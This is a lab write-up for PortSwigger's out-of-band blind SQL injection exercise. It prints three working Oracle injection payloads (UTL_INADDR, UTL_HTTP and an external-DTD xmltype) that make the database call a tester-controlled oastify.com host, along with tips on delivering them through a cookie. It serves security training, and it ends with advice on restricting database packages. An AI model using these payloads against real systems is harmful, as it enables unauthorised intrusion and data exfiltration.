# Blind SQL injection with out-of-band interaction

**Category:** SQL Injection
**Difficulty:** PRACTITIONER
**Lab:** https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band

Every blind technique in this series so far has relied on the application's own HTTP response —
content, status, or timing — as the channel back to the attacker. Out-of-band injection breaks
that assumption entirely: instead of reading an answer off the response the browser gets, we make
the *database server itself* reach out to infrastructure we control, over a completely separate
network connection.

## The Target

The `TrackingId` cookie again, this time on an Oracle backend deliberately configured so that
neither content, status code, nor timing differ in any observable way — the usual blind channels
are all closed off, which is the point: this lab exists specifically to force the out-of-band
technique.

## The Investigation

Oracle ships several built-in package functions that perform network operations as a side effect
of being evaluated — resolving a hostname, making an HTTP request — regardless of whether the
surrounding query ultimately succeeds or errors. That side effect is the entire attack: if we can
get one of those functions to evaluate with a hostname we control, a successful DNS lookup or HTTP
request against our infrastructure is proof the injection fired, independent of anything the HTTP
response says.

`UTL_INADDR.get_host_address()` performs a DNS lookup; `UTL_HTTP.request()` issues an HTTP request;
both can be embedded in an otherwise ordinary UNION-based injection. We also tried wrapping the
callback in an `EXTRACTVALUE(xmltype(...))` construction that forces Oracle's XML parser to fetch
an external DTD — the same class of technique documented in this series' XXE labs, repurposed here
as a delivery mechanism for the outbound request rather than for reading a file.

For the destination, PortSwigger Academy labs auto-detect interactions against `*.oastify.com`
subdomains without needing a separate Burp Collaborator client to poll for them — any DNS or HTTP
hit to a random subdomain under that domain is enough to auto-solve the lab, which meant we didn't
need Burp Suite Professional for this particular lab, only a random token to use as a unique
subdomain label.

One delivery detail mattered more than expected: sending the payload through a normal cookie-jar
mechanism (rather than a raw `Cookie` header string) corrupted the Oracle payload's special
characters before it reached the server. Building the `Cookie` header manually, byte for byte,
avoided that mangling entirely.

## The Exploit

We generated a random subdomain label and sent several payload variants against it concurrently,
to maximize the odds that at least one Oracle function fired successfully in this environment:

```
'||(SELECT UTL_INADDR.get_host_address('<random>.oastify.com') FROM dual)||'
'||(SELECT UTL_HTTP.request('http://<random>.oastify.com/') FROM dual)||'
'||(SELECT EXTRACTVALUE(xmltype('<?xml version="1.0"?><!DOCTYPE x
   [<!ENTITY % r SYSTEM "http://<random>.oastify.com/">%r;]>'),'/x') FROM dual)||'
```

All three were delivered via a manually-constructed `Cookie` header rather than a cookie dictionary.
Within roughly ten to twenty seconds of sending them, the lab registered as solved — Academy's own
backend had observed the DNS/HTTP interaction against our subdomain and flipped the state
server-side, with no further action needed on our end.

## Comparing Notes: PortSwigger's Official Solution

PortSwigger's solution uses the `EXTRACTVALUE(xmltype(...))` external-DTD construction as its
primary payload, with a Burp Collaborator subdomain inserted via Burp's "Insert Collaborator
payload" feature rather than a manually generated random label. Same underlying Oracle XML-parsing
side effect, same outbound HTTP callback mechanism.

We reached for `UTL_INADDR` and `UTL_HTTP` first rather than the XML route, because in our testing
those two consistently returned a clean HTTP 200 from the application while the XML/DTD payload
returned a 500 in this cookie-injection context — still triggering the callback either way, but the
`UTL_INADDR`/`UTL_HTTP` route gave us a cleaner signal that the request itself was well-formed. We
sent all three payload variants together rather than committing to one, which is really a
reliability choice rather than a technique disagreement: any of the three Oracle functions
triggering the outbound request is sufficient, and PortSwigger's own topic material documents
`UTL_HTTP`, `UTL_INADDR`, and the XML/DTD route as interchangeable options for this exact scenario.
The bigger practical difference is that this specific lab only needs *interaction*, not data
recovery — which meant we didn't need Burp Collaborator's polling API at all, since Academy's
platform detects the callback and marks the lab solved on its own.

## What This Teaches Us

Out-of-band techniques matter precisely because they don't depend on any property of the HTTP
response at all — no content, no status code, no timing difference, nothing the application's own
defenses could plausibly normalize away. The vulnerability being exploited here isn't really about
`UTL_INADDR` or `UTL_HTTP` specifically; it's about database functions with network side effects
being reachable at all from a context an attacker controls. Locking down which packages a database
account can execute — not just parameterizing queries — is a genuine additional layer of defense
against this specific class of callback-based exfiltration, on top of the injection fix itself.
